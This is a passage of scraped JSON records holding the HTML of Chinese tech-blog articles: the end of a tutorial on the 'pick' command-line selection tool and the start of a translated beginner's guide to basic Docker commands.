class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncd $(find . -type d | pick)\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38273ec48969716508-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38273ec48969716508-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38273ec48969716508-1\"><span class=\"crayon-i\">cd</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">type</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pick</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38273ec48969716508-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>这个命令会列出当前工作目录下的所有目录及其子目录，你可以用上下箭头选择你想进入的目录，然后按下回车就行了。</p>\n<p>像这样：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/7d112f146569e6ad0cf3eb62defddc10.png\" alt=\"\"></p>\n<p>而且，它还会根据你输入的内容过滤目录和文件。比如，当我输入 “or” 时会显示如下结果。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/1db4853003ed6321a72b1ac1ff473d3d.png\" alt=\"\"></p>\n<p>这只是一个例子。你也可以将 <code>pick</code> 命令跟其他命令一起混用。</p>\n<p>这是另一个例子。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38273ec4b106597286\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfind -type f | pick | xargs less\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38273ec4b106597286-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38273ec4b106597286-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38273ec4b106597286-1\"><span class=\"crayon-v\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">type</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">f</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pick</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">xargs </span><span class=\"crayon-i\">less</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38273ec4b106597286-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>该命令让你选择当前目录中的某个文件并用 <code>less</code> 来查看它。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/cbfa180365bc1990e9121309b81fb5ee.png\" alt=\"\"></p>\n<p>还想看其他例子？还有呢。下面命令让你选择当前目录下的文件或目录，并将之迁移到其他地方去，比如这里我们迁移到 <code>/home/sk/ostechnix</code>。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38273ec4e314606131\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmv \"$(find . -maxdepth 1 |pick)\" /home/sk/ostechnix/\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38273ec4e314606131-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38273ec4e314606131-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38273ec4e314606131-1\"><span class=\"crayon-i\">mv</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"$(find . -maxdepth 1 |pick)\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sk</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38273ec4e314606131-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/6187091d46b0b73336ddb482c5ae6f40.png\" alt=\"\"></p>\n<p>通过上下按钮选择要迁移的文件，然后按下回车就会把它迁移到 <code>/home/sk/ostechnix/</code> 目录中的。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/b7df7f0dcb71b09605e0bb76d84f68b7.png\" alt=\"\"></p>\n<p>从上面的结果中可以看到，我把一个名叫 <code>abcd</code> 的目录移动到 <code>ostechnix</code> 目录中了。</p>\n<p>使用方式是无限的。甚至 Vim 编辑器上还有一个叫做 <a href=\"https://github.com/calleerlandsson/pick.vim/\">pick.vim</a> 的插件让你在 Vim 中选择更加方便。</p>\n<p>要查看详细信息，请参阅它的 man 页。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38273ec52096350752\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nman pick\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38273ec52096350752-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38273ec52096350752-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38273ec52096350752-1\"><span class=\"crayon-e\">man </span><span class=\"crayon-i\">pick</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38273ec52096350752-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>我们的讲解至此就结束了。希望这款工具能给你们带来帮助。如果你觉得我们的指南有用的话，请将它分享到您的社交网络上，并向大家推荐我们。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113480\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113480votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113480\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/01/382b1251c2cdb32cf334445596f97085.png"], "title": "为小白准备的重要 Docker 命令说明", "fav_nums": 2, "url": "http://blog.jobbole.com/113490/", "create_date": "2018/01/16", "url_object_id": "148acfe5c7841aeb6acee354b96cab45", "comment_nums": 1, "front_image_path": "full/67490ccebef720732b63d9ddb9e17fb0a590e30a.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://linuxtechlab.com/important-docker-commands-beginners/\">Shusain </a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9227-1.html\">lujun9972</a>   </div><p>在早先的教程中，我们学过了<a href=\"http://linuxtechlab.com/create-first-docker-container-beginners-guide/\">在 RHEL CentOS 7 上安装 Docker 并创建 docker 容器</a>。 在本教程中，我们会学习管理 docker 容器的其他命令。</p>\n<h3 id=\"toc_1\">Docker 命令语法</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f33d579a32203346779\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ docker [option] [command] [arguments]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a32203346779-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a32203346779-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f33d579a32203346779-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">docker</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">option</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">command</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">arguments</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a32203346779-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>要列出 docker 支持的所有命令，运行</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f33d579a3d477195241\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ docker\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a3d477195241-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a3d477195241-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f33d579a3d477195241-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">docker</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a3d477195241-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>我们会看到如下结果，</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f33d579a41465921372\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nattach Attach to a running container\r\nbuild  Build an image from a Dockerfile\r\ncommit  Create a new image from a container's changes\r\ncp  Copy files/folders between a container and the local filesystem\r\ncreate  Create a new container\r\ndiff  Inspect changes on a container's filesystem\r\nevents  Get real time events from the server\r\nexec  Run a command in a running container\r\nexport  Export a container's filesystem as a tar archive\r\nhistory  Show the history of an image\r\nimages  List images\r\nimport  Import the contents from a tarball to create a filesystem image\r\ninfo  Display system-wide information\r\ninspect  Return low-level information on a container or image\r\nkill  Kill a running container\r\nload  Load an image from a tar archive or STDIN\r\nlogin  Log in to a Docker registry\r\nlogout  Log out from a Docker registry\r\nlogs  Fetch the logs of a container\r\nnetwork  Manage Docker networks\r\npause  Pause all processes within a container\r\nport  List port mappings or a specific mapping for the CONTAINER\r\nps  List containers\r\npull  Pull an image or a repository from a registry\r\npush  Push an image or a repository to a registry\r\nrename  Rename a container\r\nrestart  Restart a container\r\nrm  Remove one or more containers\r\nrmi  Remove one or more images\r\nrun  Run a command in a new container\r\nsave  Save one or more images to a tar archive\r\nsearch  Search the Docker Hub for images\r\nstart  Start one or more stopped containers\r\nstats  Display a live stream of container(s) resource usage statistics\r\nstop  Stop a running container\r\ntag  Tag an image into a repository\r\ntop  Display the running processes of a container\r\nunpause  Unpause all processes within a container\r\nupdate  Update configuration of one or more containers\r\nversion  Show the Docker version information\r\nvolume  Manage Docker volumes\r\nwait  Block until a container stops, then print its exit code\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a41465921372-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a41465921372-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a41465921372-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a41465921372-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a41465921372-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a41465921372-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a41465921372-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a41465921372-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a41465921372-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a41465921372-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a41465921372-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a41465921372-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a41465921372-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a41465921372-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a41465921372-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a41465921372-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a41465921372-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a41465921372-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a41465921372-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a41465921372-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a41465921372-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a41465921372-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a41465921372-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a41465921372-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a41465921372-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a41465921372-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a41465921372-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a41465921372-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a41465921372-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a41465921372-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a41465921372-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a41465921372-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a41465921372-33\">33</div><div class=\"crayon-num crayon-striped-num\" 